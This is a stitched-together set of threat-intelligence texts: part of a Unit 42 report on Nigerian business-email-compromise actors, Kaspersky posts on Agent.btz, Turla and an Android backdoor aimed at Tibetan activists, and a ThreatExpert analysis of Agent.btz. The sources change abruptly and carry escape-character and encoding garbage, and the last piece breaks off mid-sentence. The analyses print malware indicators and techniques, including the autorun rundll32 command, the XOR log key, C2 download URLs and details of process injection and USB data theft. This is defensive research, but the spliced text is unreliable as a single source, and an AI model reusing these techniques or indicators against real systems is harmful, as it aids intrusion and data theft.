in various locations across the globe. The list of locations has expanded over the past year as actors have been identi˜ed living abroad in the United States, United Kingdom, Malaysia, Turkey and other African countries. Given this dispersion, SilverTerrier actors continue to demonstrate growth in their organized structure with minimal degrees of social separation. Although the number of actors continues to ˚uctuate, these actors remain in similar social circles based on the universities they attended, social network connections for the tools they use or cities in which they live. As a result, social media platforms, such as Facebook and Google+®, serve as excellent tools to support elementary-level link analysis between actors. In fact, link analysis proves remarkably successful when applied Figure 12 + Number of actors per month from August 2016 through August 2017 PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 13to identify new or suspected threat actors and facilitators. For example, consider a scenario in which you learn that three known threat actors all share a common friend. In reviewing that friend™s pro˜le, you observe that his pro˜le picture ˚aunts foreign currency, his job title is ﬁCEO of Self-Employed,ﬂ and he happens to be a member of several online technology and hacking clubs. Alone, none of these bits of information are conclusive, but when combined and paired with an association with known SilverTerrier actors, such an individual de˜nitely stands out (see Figure 13). Employing this technique over the past year, Unit 42 has successfully linked many of these individuals to previously unattributed samples of malware. In addition to enabling link analysis, these social media platforms also provide insights into public groups dedicated to online cybercrime. For example, searching for the terms ﬁWire Wireﬂ or ﬁWire Transferﬂ on social media platforms often reveals several groups associated with cybercrime and further provides a means to identify suspected participants. The group ﬁWIRE WIRE.COMﬂ on Facebook serves as a prime example (see Figure 14). Using this public group, members have exchanged contact information and solicited help with their illegal activities. Figure 13 + Using social media to identify suspected cyber actors Figure 14 + WIRE WIRE.COM Facebook Group PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 14This group also serves as a key resource for cybersecurity analysts seeking to identify leadership roles and relationships between actors. Speci˜cally, new members requesting access to this group need to be sponsored by existing members. This results in the membership page for the group containing a list of suspected cybercriminals and the names of those who sponsored them for access, as well as the date they joined the group (see Figure 15). Combining the wealth of publicly available information with data from Palo Alto Networks malware repositories continues to drive various degrees of attribution analysis. It also promotes an enhanced understanding of the interconnections between actors, suspects, tools and organizations. This analysis is applied to enable predictive analysis with the goal of enhancing the preventive capabilities of our platform. AttributionAttribution is a complex concept that often evokes a wide range of perceptions depending on the audience to which it is presented. To consumers of cybersecurity reports, the term is commonly viewed in a positive light as it is used to link nefarious characters directly to the crimes they commit. On the other hand, from a strictly business standpoint within the cybersecurity industry, the term is often viewed through a more ambivalent lens. This distinction is due to attribution efforts often requiring tremendous analytic resources without a guaranteed return on investment. This results in cybersecurity organizations focusing their sparse investigative resources against high-priority threats. Though pragmatic in its approach, this line of thinking has simultaneously advanced yet constrained the industry. The world has undoubtedly witnessed iterative advancements over the past decade as stories describing cyber intrusions have cemented positions as trending, front- page news. Concurrently, reports produced by cybersecurity organizations and private researchers have expanded to a point where they effectively complement and inform efforts historically performed solely by government and law enforcement organizations. However, despite this positive trend, many of these attribution efforts Figure 15 + WIRE WIRE.COM membership details PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 15remain scoped and constrained to data sets with no more than a handful of criminals, a couple of malware samples and a few dozen other indicators. Simply put, the efforts are scoped consistent with the analytic resources that can be brought to bear against a speci˜c data set. By comparison, the SilverTerrier data set has grown to become multiple orders of magnitude greater. With more than 300 actors, 11,600 domains, 30,000 samples of malware and details surrounding roughly 500,000 attacks, the challenge with using a data set of this size quickly becomes a question of scale. For the cybersecurity industry at large, the ability to scale attribution efforts to accommodate ever-expanding data sets while minimizing resources and maximizing results remains a nascent concept. In evaluating the success associated with this analytic effort, we believe advancements in data-visualization techniques, the wealth of data produced by NGFW products, and ﬁbig dataﬂ analytics can be combined to achieve valuable attribution insights that encompass the breadth and depth associated with large data sets. To that end, we recognize there are many levels of attribution, each delivering different degrees of value depending on the target audience. For example, the highest levels of attribution link cyber activities directly to individuals and their social media accounts, physical addresses, and other descriptive characteristics (see Figure 16). These details are often desirable as they shed light on the motivations, relationships, experiences and capabilities of an individual actor, but this level of analysis is also considered the most resource-intensive. Figure 16 + Example of high-level attribution PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 16On the other end of the spectrum are lower levels of attribution, which are often discounted and overlooked but can augment network defense when applied effectively. Consider, for a moment, if your network security could not only identify malware but also provide insight into the actor group responsible. From a research standpoint, the resources required to achieve this result are minimal, and easy to automate and develop into scalable approaches. Simply identifying malware C2 domains and correlating patterns associated with domain registration details can provide these low levels of attribution (see Figure 17). As such, we believe that, for minimal cost, these efforts provide Palo Alto Networks customers with greater visibility into the threats targeting their networks as well as enable customers to tailor their investigative resources accordingly. In between these two lies a fascinating range of capabilities that can expand upon low- level attribution and provide immensely valuable information for network defenders at minimal cost (see Figure 18). When evaluating how to scale attribution efforts for large data sets, this becomes the ideal case. For example, low-level attribution efforts can easily be augmented through the automated use of resources such as PassiveTotal Ž or DomainTools ®, which can be leveraged to pivot through and identify a complete list of domains associated with a speci˜c actor. Recognizing that each cybersecurity company only observes attacks against its own customer base, this complete list of domains can then be compared across the industry to further enrich the data set. Combined, this largely automated approach produces signi˜cant results, building a foundational picture of a cyber adversary and, more importantly, a foundation for predictive analysis. Figure 17 + Example of low-level attribution Figure 18 + Example of medium-level attribution PALO ALTO NETWORKS + THE RISE OF NIGERIAN BUSINESS EMAIL COMPROMISE 17Using Figure 18 as an exemplar, we ˜rst identify the domains slowlogger.in and 0nvol. net as being directly linked to known malware samples within Palo Alto Networks malware repository. Using the registration details associated with these two domains as a starting point for enumeration, we use PassiveTotal to identify six previously unknown domains registered to the same actor. These new domains help form a pro˜le of the actor by establishing an association between three names, one organization, two phone numbers and a single email address. If needed, we can apply these details later to support higher levels of attribution analysis. Next, we evaluate the domains across the industry to reveal that other cybersecurity organizations have already ˚agged three as malicious. Finally, in the last step, we manually analyze the remaining three domains in conjunction with the totality of the actor™s activity. As it applies to this example, the actor is associated with eight domains, ˜ve of which have been attributed to malicious activity, while the remaining three appear to impersonate a technology company, a supply chain management organization and a credit union, respectively. Armed with this powerful perspective, network administrators can begin to tailor their defensive capabilities to focus on prevention, adopting a proactive posture against anticipated threats. Applying this concept to the SilverTerrier data set as a whole, Unit 42 has successfully scaled this level of attribution and analysis against an expanding data set using minimal resources, with tremendous gains. These techniques continue to enable Palo Alto Networks to identify suspicious domains and put preventive measures in place prior to the ˜rst samples of malware reaching our security products. ConclusionKey Takeaways Ł Nigerian cyber actors remain a formidable threat to businesses worldwide, demonstrating a 45 percent increase in attacks recorded from August 2016 through August 2017. Ł These actors are educated adults ranging in age from their 20s to 40s. Many participate in cybercrime as a means to supplement legitimate employment, and most actors leverage social media platforms as tools to promote organization and collaboration.Ł Information stealing malware families remain in common use, with SilverTerrier actors producing an average of 840 samples per month. This represents a 17 percent year-over-year increase, with Agent Tesla, LokiBot and Pony standing out as the most popular tools in the category. Ł SilverTerrier actors have begun to incorporate RATs into their criminal activities at a signi˜cant rate. Our data shows these actors can produce an average rate of 146 samples per month. This represents a 49 percent increase over previous years, with the three most popular tools being DarkComet, NetWire and NanoCore.

Source of Inspiration?\\nBy Alexander Gostev\\non March 12, 2014. 8:38 pm\\nThe past few days has seen an extensive\\xa0discussion\\xa0within the IT security industry about a cyberespionage campaign called Turla, aka Snake and Uroburos, which, according to G-DATA experts, may have been created by Russian special services.\\nOne of the main conclusions also pointed out by research from BAE SYSTEMS, is a connection between the authors of Turla and those of another malicious program, known as Agent.BTZ, which infected the local networks of US military operations in the Middle East in 2008.\\nWe first became aware of this targeted campaign in March 2013. This became apparent when we investigated an incident which involved a highly sophisticated rootkit. We called it the ‘Sun rootkit’, based on a filename used as a virtual file system: sunstore.dmp, also accessible as \\\\.Sundrive1 and \\\\.Sundrive2. The ‘Sun rootkit’ and Uroburos are the same.\\nWe are still actively investigating Turla, and we believe it is far more complex and versatile than the already published materials suggest.\\nAt this point, I would like to discuss the connection between Turla and Agent.btz in a little more detail.\\nAgent.btz: a global epidemic or a targeted attack?\\nThe story of Agent.btz began back in 2007 and was extensively covered by the mass media in late 2008 when\\xa0it was used to infect US military networks.\\nHere is what\\xa0Wikipedia\\xa0has to say about it: “The 2008 cyberattack on the United States was the ‘worst breach of U.S. military computers in history’. The defense against the attack was named ‘Operation Buckshot Yankee’. It led to the creation of the United States Cyber Command.\\nIt started when a USB flash drive infected by a foreign intelligence agency was left in the parking lot of a Department of Defense facility at a base in the Middle East. It contained malicious code and was put into a USB port from a\\xa0laptop computer\\xa0that was attached to United States Central Command.\\nThe Pentagon spent nearly 14 months cleaning the worm, named Agent.btz, from military networks. Agent.btz, a variant of the SillyFDC worm, has the ability ‘to scan computers for data, open backdoors, and send through those backdoors to a remote command and control server’.”\\nWe do not know how accurate is the story with the USB flash drive left in the parking lot. We have also heard a number of other versions of this story, which may, or may not be right. However, the important fact here is that Agent.btz was a self replicating computer worm, not just a Trojan. Another important fact is that the malware has dozens of different variants.\\nWe believe that the initial variants of the worm were created back in 2007. By 2011 a large number of its modifications had been detected. Today, most variants are detected by Kaspersky products asWorm.Win32.Orbina.\\nCuriously, in accordance with the naming convention used by PC Tools, the worm is also namedVoronezh.1600\\xa0– possibly a reference to the mythical Voronezh school of hackers, in Russia.\\nIn any event, it is quite obvious that the US military were not the only victims of the worm. Copying itself from one USB flash drive to another, it rapidly spread globally. Although no new variants of the malware have been created for several years and the vulnerability enabling the worm to launch from USB flash drives using “autorun.inf” have long since been closed in newer versions of Windows, according to our data Agent.btz was detected 13,832 times in 107 countries across the globe in 2013 alone!\\nThe dynamics of the worm’s epidemic are also worth noting. Over three years – from 2011 to 2013 – the number of infections caused by Agent.btz steadily declined; however, the top 10 affected countries changed very little.\\nAgent.BTZ detections (unique users)\\n2011\\n1\\nRussian Federation\\n24111\\n2\\nSpain\\n9423\\n3\\nItaly\\n5560\\n4\\nKazakhstan\\n4412\\n5\\nGermany\\n3186\\n6\\nPoland\\n3068\\n7\\nLatvia\\n2805\\n8\\nLithuania\\n2016\\n9\\nUnited Kingdom\\n761\\n10\\nUkraine\\n629\\nTotal countries\\n147\\nTotal users\\n63021\\nAgent.BTZ detections (unique users)\\n2012\\n1\\nRussian Federation\\n11211\\n2\\nSpain\\n5195\\n3\\nItaly\\n3052\\n4\\nGermany\\n2185\\n5\\nKazakhstan\\n1929\\n6\\nPoland\\n1664\\n7\\nLatvia\\n1282\\n8\\nLithuania\\n861\\n9\\nUnited Kingdom\\n335\\n10\\nUkraine\\n263\\nTotal countries\\n130\\nTotal users\\n30923\\nAgent.BTZ detections (unique users)\\n2013\\n1\\nRussian Federation\\n4566\\n2\\nSpain\\n2687\\n3\\nGermany\\n1261\\n4\\nItaly\\n1067\\n5\\nKazakhstan\\n868\\n6\\nPoland\\n752\\n7\\nLatvia\\n562\\n8\\nLithuania\\n458\\n9\\nPortugal\\n157\\n10\\nUnited Kingdom\\n123\\nTotal countries\\n107\\nTotal users\\n13832\\nThe statistics presented above are based on the following Kaspersky Anti-Virus verdicts: Worm.Win32.Autorun.j, Worm.Win32.Autorun.bsu, Worm.Win32.Autorun.bve, Trojan-Downloader.Win32.Agent.sxi, Worm.Win32.AutoRun.lqb, Trojan.Win32.Agent.bve, Worm.Win32.Orbina\\nTo summarize the above, the Agent.btz worm has clearly spread all over the world, with Russia leading in terms of the number of infections for several years.\\nMap of infections caused by different modifications of “Agent.btz” in 2011-2013\\nFor detailed information on the modus operandi of Agent.btz, I recommend reading an excellent\\xa0report prepared by Sergey Shevchenko from ThreatExpert, back in November 2008.\\nOn infected systems, the worm creates a file named ‘thumb.dd’ on all USB flash drives connected to the computer, using it to store a CAB file containing the following files: “winview.ocx”, “wmcache.nld” and “mswmpdat.tlb”. These files contain information about the infected system and the worm’s activity logs for that system. Essentially, “thumb.dd” is a container for data which is saved on the flash drive, unless it can be sent directly over the Internet to the C&C server.\\nIf such a flash drive is inserted into another computer infected with Orbina, the file “thumb.dd” will be copied to the computer under the name “mssysmgr.ocx”.\\nGiven this functionality and the global scale of the epidemic caused by the worm, we believe that there are tens of thousands of USB flash drives in the world containing files named “thumb.dd” created by Agent.btz at some point in time and containing information about systems infected by the worm.\\nRed October: a data collector?\\nOver one year ago, we analyzed dozens of modules used by Red October, an extremely sophisticated cyber espionage operation. While performing the analysis, we noticed that the list of files that a module named “USB Stealer” searches for on USB flash drives connected to infected computers included the names of files created by Agent.btz “mssysmgr.ocx” and “thumb.dd”.\\nThis means that Red October developers were actively looking for data collected several years previously by Agent.btz. All the USB Stealer modules known to us were created in 2010-2011.\\nBoth Red October and Agent.btz were, in all probability, created by Russian-speaking malware writers. One program “knew” about the files created by the other and tried to make use of them. Are these facts sufficient to conclude that there was a direct connection between the developers of the two malicious programs?\\nI believe they are not.\\nFirst and foremost, it should be noted that the fact that the file “thumb.dd” contains data from Agent.btz-infected systems was publicly known. It is not impossible that the developers of Red October, who must have been aware of the large number of infections caused by Agent.btz and of the fact that the worm had infected US military networks, simply tried to take advantage of other people’s work to collect additional data. It should also be remembered that Red October was a tool for highly targeted pinpoint attacks, whereas Agent.btz was a worm, by definition designed to spread uncontrollably and “collect” any data it could access.\\nBasically, any malware writer could add scanning of USB flash drives for “thumb.dd” files and the theft of those files to their Trojan functionality. Why not steal additional data without too much additional effort? However, decrypting the data stolen requires one other thing – the encryption key.\\nAgent.btz and Turla/Uroburos\\nThe connection between Turla and Agent.btz is more direct, although not sufficiently so to conclude that the two programs have the same origin.\\nTurla uses the same file names as Agent.btz – “mswmpdat.tlb”, “winview.ocx” and “wmcache.nld” for its log files stored on infected systems.\\nAll the overlapping file names are presented in the table below:\\nAgent.btz\\nRed October\\nTurla\\nLog files\\nthumb.dd\\nthumb.dd\\nwinview.ocx\\nwinview.ocx\\nmssysmgr.ocx\\nmssysmgr.ocx\\nwmcache.nld\\nwmcache.nld\\nmswmpdat.tlb\\nmswmpdat.tlb\\nfa.tmp\\nfa.tmp\\nIn addition, Agent.btz and Turla use the same XOR key to encrypt their log files:\\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6\\nas80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\\nThe key is not a secret, either: it was discovered and published back in 2008 and anybody who had an interest in the Agent.btz story knew about the key. Is it possible that the developers of Turla decided to use somebody else’s key to encrypt their logs? We are as yet unable to determine at what point in time this particular key was adopted for Turla. It is present in the latest samples (dated 2013-2014), but according to some data the development of Turla began back in 2006 – before the earliest known variant of Agent.btz was created.\\nRed October and Turla\\nNow we have determined that Red October “knew” about the file names used by Agent.btz and searched for them. We have also determined that Turla used the same file names and encryption key as Agent.btz.\\nSo what about a possible connection between Red October and Turla? Is there one? Having analyzed all the data at our disposal, we do not see any overlapping between the two projects. They do not “know” about each other, they do not communicate between themselves in any way, they are different in terms of their architecture and the technologies used.\\nThe only thing they really have in common is that the developers of both Rocra and Turla appear to have Russian as their native language.<?\\nWhat about Flame?\\nBack in 2012, while analyzing Flame and its cousins Gauss and MiniFlame, we noticed some similarities between them and Agent.btz (Orbina). The first thing we noticed was the analogous naming convention applied, with a predominance of use of files with the .ocx extension. Let’s take as an example the name of the main module of Flame – “mssecmgr.ocx”. In Agent.btz a very similar name was used for the log-file container on the infected system – “mssysmgr.ocx”. And in\\xa0Gauss\\xa0all modules were in the form of files with names *.ocx.\\nFeature\\nFlame\\nGauss\\nEncryption methods\\nXOR\\nXOR\\nUsing USB as storage\\nYes (hub001.dat)\\nYes (.thumbs.db)\\nThe Kurt/Godel module in Gauss contains the following functionality: when a drive contains a ‘.thumbs.db’ file, its contents are read and checked for the magic number 0xEB397F2B. If found, the module creates %commonprogramfiles%systemwabdat.dat and writes the data to this file, and then deletes the ‘.thumbs.db’ file.\\nThis is a container for data stolen by the ‘dskapi’ payload.\\nBesides, MiniFlame (module icsvnt32) also ‘knew’ about the ‘.thumbs.db’ file, and conducted a search for it on USB sticks.\\nIf we recall how our data indicate that the development of both Flame and Gauss started back in 2008, it can’t be ruled out that the developers of these programs were well acquainted with the analysis of Agent.btz and possibly used some ideas taken from it in their development activities.\\nAll together now\\nThe data can be presented in the form of a diagram showing the interrelations among all the analyzed malicious programs:\\nAs can be seen in the diagram, the developers of all three (even four, if we include Gauss) spy programs knew about Agent.btz, i.e., about how it works and what filenames it uses, and used that information either to directly adopt the functionality, ideas and even filename, or attempted to use the results of the work of Agent.btz.\\nSummarizing all the above, it is possible to regard Agent.btz as a certain starting point in the chain of creation of several different cyber-espionage projects. The well-publicized story of how US military networks were infected could have served as the model for new espionage programs having similar objectives, while its technologies were clearly studied in great detail by all interested parties. Were the people behind all these programs all the same? It’s possible, but the facts can’t prove it.\\nAPT Botnets Cyber espionage Targeted Attacks\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nRoaming Mantis, part V\\nAZORult spreads as a fake ProtonVPN installer\\nDDoS attacks in Q4 2019\\nLeave a Reply Cancel Reply\\nYour email address will not be published.

This is a classification from F-Secure. Other vendors name this threat mostly as Autorun. Some of the aliases assigned to this threat might seem confusing. There is even a clash with another threat that is also detected as Agent.btz by another vendor – but that\\'s a totally different threat with different functionality. This post is about F-Secure-classified Agent.btz – the one that was involved into the aforementioned incident.At the time of this writing, ThreatExpert system has received and processed several different samples of this threat – further referred as Agent.btz. All these builds exhibit common functionality.Agent.btz is a DLL file. When loaded, its exported function DllEntryPoint() will be called automatically. Another exported function of this DLL, InstallM(),is called during the initial infection stage, via a command-line parameter for the system file rundll32.exe.Infection VectorThe infection normally occurs via a removable disk such as thumb drive (USB stick) or any other external hard drive. Once a removable disk is connected to a computer infected with Agent.btz, the active malware will detect a newly recognized drive. It will drop its copy on it and it will create autorun.inf file with an instruction to run that file. When a clean computer recognizes a newly connected removable drive, it will (by default) detect autorun.inf file on it, it will then open it and follow its instruction to load the malware.Another infection vector: when a clean computer attempts to map a drive letter to a shared network resource that has Agent.atz on it and the corresponding autorun.inf file, it will (by default) open autorun.inf file and follow its instruction to load the malware. Once infected, it will do the same with other removable drives connected to it or other computers in the network that attempt to map a drive letter to its shared drive infected with Agent.atz – hence, the replication.The autorun.inf file it creates contains the following command to run rundll32.exe:rundll32.exe .\\\\\\\\random_name.dll,InstallMFunctionalityWhen Agent.btz DLL is loaded, it will decrypt some of the strings inside its body. Agent.btz file is not packed. The strings it decrypts are mostly filenames, API names, registry entries, etc.After decrypting its strings, Agent.btz dynamically retrieves function pointers to the following kernel32.dll APIs: WriteProcessMemory(), VirtualAllocEx(), VirtualProtectEx(). It will need these APIs later to inject malicious code into Internet Explorer process.Agent.btz spawns several threads and registers window class \"zQWwe2esf34356d\".The first thread will try to query several parameters from the values under the registry key:HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\StrtdCfgSome of these parameters contain such details as time out periods, flags, or the name of the domain from which the additional components can be downloaded.The first thread will spawn 2 additional threads. One of them will wait for 5 minutes, and then it will attempt to download an encrypted binary from the domain specified in the parameters.For example, it may attempt to download the binaries from these locations:http://biznews.podzone.org/update/img0008/random digits.jpgorhttp://worldnews.ath.cx/update/img0008/random digits.jpgThe downloaded binary will be saved under the file name $1F.dll into the temporary directory.Once the binary is saved, Agent.btz signals its threads with \"wowmgr_is_loaded\" event, saves new parameters into the registry values under the key \"StrtdCfg\", loads Internet Explorer process, decrypts the contents of the downloaded binary, injects it into the address space of Internet Explorer and then spawn a remote thread in it.At the time of this writing the contents of the binary is unknown as the links above are down. Thus, it’s not known what kind of code could have been injected into the browser process. The only assumption can be made here is that the remote thread was spawned inside Internet Explorer process in order to bypass firewalls in its attempt to communicate with the remote server.InstallationAgent.btz drops its copy into %system% directory by using a random name constructed from the parts of the names of the DLL files located in the %system% directory.It registers itself as an in-process server to have its DLL loaded with the system process explorer.exe. The CLSID for the in-process server is also random - it is produced by UuidCreate() API.This threat may also store some of its parameters by saving them into the values nParam, rParam or id under the system registry key below:HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\CrashImageOn top of that, Agent.btz carries some of its parameters in its own body – stored as an encrypted resource named CONFIG. Agent.btz locates this resource by looking for a marker 0xAA45F6F9 in its memory map.File wmcache.nldThe second spawned thread will wait for 10 seconds. Then, it’ll save its parameters and some system information it obtains in an XML file %system%\\\\wmcache.nld.The contents of this file is encoded by XOR-ing it with the following mask:1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0sBelow is the decoded fragment of the XML file, provided as example:<?xml version=\"1.0\" encoding=\"unicode\"?><Cfg><Ch><add key=\"Id\" value=\"3024688254\" /><add key=\"PVer\" value=\"Ch 1.5\" /><add key=\"Folder\" value=\"img0008\" /><add key=\"Time\" value=\"29:11:2008 18:44:46\" /><add key=\"Bias\" value=\"4294967285\" /><add key=\"PcName\" value=\"%ComputerName%\" /><add key=\"UserName\" value=\"%UserName%\" /><add key=\"WinDir\" value=\"%windir%\" /><add key=\"TempDir\" value=\"%temp%\" /><add key=\"WorkDir\" value=\"%system32%\" /><add key=\"Cndr\" value=\"0\" /><add key=\"List\" value=\"\"><add key=\"\\n0\" value=\"2\" /></add><add key=\"NList\" value=\"\"></add></Ch>...</Cfg>Besides the basic system information above, Agent.btz contains the code that calls GetAdaptersInfo() and GetPerAdapterInfo() APIs in order to query network adapter’s IP and MAC address, IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP and DNS servers. The collected network details are also saved into the log file.File winview.ocxThe second spawned thread will log threat activity into the file %system32%\\\\winview.ocx.This file is also encrypted with the same XOR mask. Here is the decrypted example contents of that file:18:44:44 29.11.2008 Log begin:18:44:44 Installing to C:\\\\WINDOWS\\\\system32\\\\random_name.dll18:44:44 Copying c:\\\\windows\\\\system32\\\\threat_file_name.dll to C:\\\\WINDOWS\\\\system32\\\\random_name.dll (0)18:44:44 ID: {7761F912-4D09-4F09-B7AF-95F4173120A6}18:44:44 Creating Software\\\\Classes\\\\CLSID\\\\{7761F912-4D09-4F09-B7AF-95F4173120A6}18:44:44 Creating Software\\\\Classes\\\\CLSID\\\\{7761F912-4D09-4F09-B7AF-95F4173120A6}\\\\InprocServer32\\\\18:44:44 Set Value C:\\\\WINDOWS\\\\system32\\\\random_name.dll18:44:44 Creating SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ShellServiceObjectDelayLoad\\\\18:44:44 Native Id: 00CD1A4018:44:44 Log end.The thread will be saving its parameters and system information into the aforementioned encrypted XML file in the loop – once in every 24 hours.File mswmpdat.tlbThe original thread will then attempt to start 2 processes: tapi32d.exe and typecli.exe – these attempts are logged. Whenever Agent.btz detects a newly connected removable disk, it will also log the device details into the same log file %system%\\\\mswmpdat.tlb.The contents of this log file is encrypted the same way – here is the decrypted fragment of it:18:44:45 29.11.2008 Log begin:18:44:45 Creating ps C:\\\\WINDOWS\\\\system32\\\\tapi32d.exe (2)18:44:45 Creating ps C:\\\\WINDOWS\\\\system32\\\\typecli.exe (2)18:44:45 Log end.19:02:48 29.11.2008 Log begin:19:02:49 Media arrived: \"D:\" Label:\"\" FS:FAT SN:0000000019:02:49 Log end.It is not clear what these 2 files are: tapi32d.exe and typecli.exe - the analyzed code does not create them. It is possible however that the missing link is in the unknown code it injects into Internet Explorer which can potentially download those files.Files thumb.dbWhen Agent.btz detects a new drive of the type DRIVE_REMOVABLE (a disk that can be removed from the drive), it attempts to create a copy of the file %system%\\\\1055cf76.tmp in the root directory of that drive as thumb.db.In opposite, if the newly connected drive already contains file thumb.db, Agent.btz will create a copy of that file in the %system% directory under the same name. It will then run %system%\\\\thumb.db as if it was an executable file and then delete the original thumb.db from the connected drive.The analyzed code does not create 1055cf76.tmp, but if it was an executable file downloaded by the code injected into Internet Explorer (as explained above), then it would have been passed into other computers under the name thumb.db. Note: an attempt to run a valid thumb.db file, which is an OLE-type container has no effect.Files thumb.dd and mssysmgr.ocxAgent.btz is capable to create a binary file thumb.dd on a newly connected drive. The contents of this file starts from the marker 0xAAFF1290 and is followed with the individual CAB archives of the files winview.ocx (installation log), mswmpdat.tlb (activity log), and wmcache.nld (XML file with system information).When Agent.btz detects a new drive with the file thumb.dd on it (system info and logs collected from another computer), it will copy that file as %system%\\\\mssysmgr.ocx.This way, the locally created files do not only contain system and network information collected from the local host, but from other compromised host (or hosts) as well.\\nPosted by\\nSergei Shevchenko\\nat\\n5:30 AM\\nLabels:\\nAgent.btz\\nNewer Post\\nOlder Post\\nHome\\nBlog Archive\\n►\\n2010\\n(7)\\n►\\nOctober\\n(1)\\n►\\nAugust\\n(2)\\n►\\nMay\\n(1)\\n►\\nApril\\n(1)\\n►\\nJanuary\\n(2)\\n►\\n2009\\n(17)\\n►\\nDecember\\n(1)\\n►\\nNovember\\n(3)\\n►\\nSeptember\\n(1)\\n►\\nJuly\\n(1)\\n►\\nJune\\n(1)\\n►\\nMay\\n(2)\\n►\\nMarch\\n(3)\\n►\\nFebruary\\n(2)\\n►\\nJanuary\\n(3)\\n▼\\n2008\\n(41)\\n►\\nDecember\\n(6)\\n▼\\nNovember\\n(5)\\nAgent.btz - A Threat That Hit Pentagon\\nSrizbi\\'s Domain Calculator\\nMorro Antivirus?\\nMcColo - Who Was Behind It?\\nOne Tricky Banking Trojan\\n►\\nOctober\\n(3)\\n►\\nAugust\\n(3)\\n►\\nJuly\\n(3)\\n►\\nJune\\n(2)\\n►\\nMay\\n(4)\\n►\\nApril\\n(8)\\n►\\nMarch\\n(2)\\n►\\nFebruary\\n(5)\\nAbout ThreatExpert™\\nThreatExpert is an advanced automated threat analysis system designed to analyze and report the behavior of computer viruses, worms, trojans, adware, spyware, and other security-related risks in a fully automated mode.\\nLinks\\nThreatExpert\\nPC Tools\\nThreatFire Blog'\n",

Found in Targeted Attack\\nBy Kurt Baumgartner, Costin Raiu, Denis Maslennikov\\non March 26, 2013. 4:14 pm\\nIn the past, we’ve seen targeted attacks against Tibetan and Uyghur activists on Windows and Mac OS X platforms. We’ve documented several interesting attacks (A Gift for Dalai Lamas Birthday and Cyber Attacks Against Uyghur Mac OS X Users Intensify) which used ZIP files as well as DOC, XLS and PDF documents rigged with exploits.\\nSeveral days ago, the e-mail account of a high-profile Tibetan activist was hacked and used to send targeted attacks to other activists and human rights advocates. Perhaps the most interesting part is that the attack e-mails had an APK attachment – a malicious program for Android.\\nThe attack\\nOn March 24th, 2013, the e-mail account of a high-profile Tibetan activist was hacked and used to send spear phishing e-mails to their contact list. This is what the spear phishing e-mail looked like:\\nIn regards to the message text above, multiple activist groups have recently organized a human rights conference event in Geneva. We’ve noticed an increase in the number of attacks using this event as a lure. Here’s another example of such an attack hitting Windows users:\\nGoing back to the Android Package (APK) file was attached to the e-mail, this is pushing an Android application named “WUC’s Conference.apk”.\\nThis malicious APK is 334326 bytes file, MD5: 0b8806b38b52bebfe39ff585639e2ea2 and is detected by Kaspersky Lab products as “Backdoor.AndroidOS.Chuli.a”.\\nAfter the installation, an application named “Conference” appears on the desktop:\\nIf the victim launches this app, he will see text which “enlightens” the information about the upcoming event:\\nThe full text reads follows. Notice notice the use of the mistaken “Word” instead of “World”:\\n“On behalf of all at the Word Uyghur Congress (WUC), the Unrepresented Nations and Peoples Organization (UNPO) and the Society for Threatened Peoples (STP), Human Rights in China: Implications for East Turkestan, Tibet and Southern Mongolia\\nIn what was an unprecedented coming-together of leading Uyghur, Mongolian, Tibetan and Chinese activists, as well as other leading international experts, we were greatly humbled by the great enthusiasm, contribution and desire from all in attendance to make this occasion something meaningful, the outcome of which produced some concrete, action-orientated solutions to our shared grievances. We are especially delighted about the platform and programme of work established in the declaration of the conference, upon which we sincerely hope will be built a strong and resolute working relationship on our shared goals for the future. With this in mind,we thoroughly look forward to working with you on these matters.\\nDolkun lsa\\nChairman of the Executive Committee\\nWord Uyghur Congress”\\nWhile the victim reads this fake message, the malware secretly reports the infection to a command-and-control server. After that, it begins to harvest information stored on the device. The stolen data includes:\\nContacts (stored both on the phone and the SIM card).\\nCall logs.\\nSMS messages.\\nGeo-location.\\nPhone data (phone number, OS version, phone model, SDK version).\\nIt is important to note that the data won’t be uploaded to C&C server automatically. The Trojan waits for incoming SMS messages (the “alarmReceiver.class”) and checks whether these messages contain one of the following commands: “sms”, “contact”, “location”, “other”. If one these commands is found, then the malware will encode the stolen data with Base64 and upload it to the command and control server. The C2 URL is:\\nhxxp://64.78.161.133/*victims’s_cell_phone_number*/process.php\\nIn addition to this, the malware also reports to another script, “hxxp://64.78.161.33/android.php”. First, it will get the “nativenumber” variable from the “telmark” value of “AndroidManifest.xml”. This is hardcoded and equals “phone”. Then, it will add the result of the public method localDate.getTime(), which simply gets the current date. An example of the string which is sent to the command-and-control would be “phone 26.03.2013”.\\nIt is interesting that the attackers used Java Base64 library developed by Sauron Software. This software is free and distributed under LGPL license.\\nAlso, command communications with the malware are parsed with a function named “chuli()” prior to POSTing stolen data to the command-and-control server. It appears that the attackers are somewhat familiar with the language and mountain-trekking culture of the targets – the meaning of “chuli” is “summit”:\\nThe command-and-control server and parameters can be easily seen in the decompiled source code:\\nCommand and control server interaction code\\nThroughout the code, the attackers log all important actions, which include various messages in Chinese. This was probably done for debugging purposes, indicating the malware may be an early prototype version. Some actions include (with rough translations):\\nThe command-and-control server\\nThe command-and-control server is located at IP 64.78.161.133. This IP is located in Los Angeles, U.S.A., at a hosting company named “Emagine Concept Inc”.\\nInterestingly, there is a domain which used to point there, “DlmDocumentsExchange.com”. The domain was registered on March 8th, 2013:\\nRegistration Service Provided By: SHANGHAI MEICHENG TECHNOLOGY INFORMATION DEVELOPMENT CO., LTD.\\nDomain Name: DLMDOCUMENTSEXCHANGE.COM\\nRegistration Date: 08-Mar-2013\\nExpiration Date: 08-Mar-2014\\nStatus:LOCKED\\nThe 